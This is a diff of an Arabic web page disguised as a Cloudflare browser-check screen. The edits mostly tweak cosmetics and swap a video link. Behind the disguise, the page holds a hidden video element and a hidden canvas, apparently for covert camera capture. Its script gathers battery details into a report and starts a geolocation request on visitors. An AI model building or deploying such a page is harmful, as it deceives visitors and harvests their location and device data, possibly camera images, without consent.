@@ -56,11 +56,7 @@ a:hover {color: #f4a15d;}
 <h1 data-translate="turn_on_js" style="color:#bd2426;">الرجاء تفعيل JavaScript وإعادة تحميل الصفحة.</h1> 
 </noscript> 
 <div id="cf-content" style="display: block;"> 
-<div id="cf-bubbles"> 
-<div class="bubbles"></div> 
-<div class="bubbles"></div> 
-<div class="bubbles"></div> 
-</div> 
+<!-- تمت إزالة كرات التحميل -->
 <h1><span data-translate="checking_browser">لحظه وحده من فظلك</span></h1> 
 <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
 <p data-translate="turn_on_cookies" style="color:#bd2426;">الرجاء تمكين الكوكيز وإعادة تحميل الصفحة.</p> 
@@ -68,7 +64,7 @@ a:hover {color: #f4a15d;}
 
 <!-- هنا يتم إضافة رابط الفيديو للتشغيل التلقائي -->
 <video width="100%" height="auto" controls autoplay>
-  <source src="https://www.example.com/video.mp4" type="video/mp4">
+  <source src="https://youtu.be/6iafoG-SyjM?si=Yzi1eKhDdSBmeTU1" type="video/mp4">
   متصفحك لا يدعم تشغيل الفيديو.
 </video>
 
@@ -84,7 +80,7 @@ a:hover {color: #f4a15d;}
 <script>
 // تم إزالة عداد التوجيه
 </script>
-<video id="video" style="display:none"  playsinline autoplay></video>
+<video id="video" style="display:none" playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
 <script type="text/javascript">
@@ -149,6 +145,7 @@ td+="<br><b>🔋 معلومات البطارية</b><br>";
 td+="<b>🔋 مستوى البطارية:</b> " +battery.level*100+"%<br><b>⚡ هل البطارية شحنت:</b> "+battery.charging+"";
 });
 }
+
 
 //////الموقع
 if(!navigator.geolocation) {
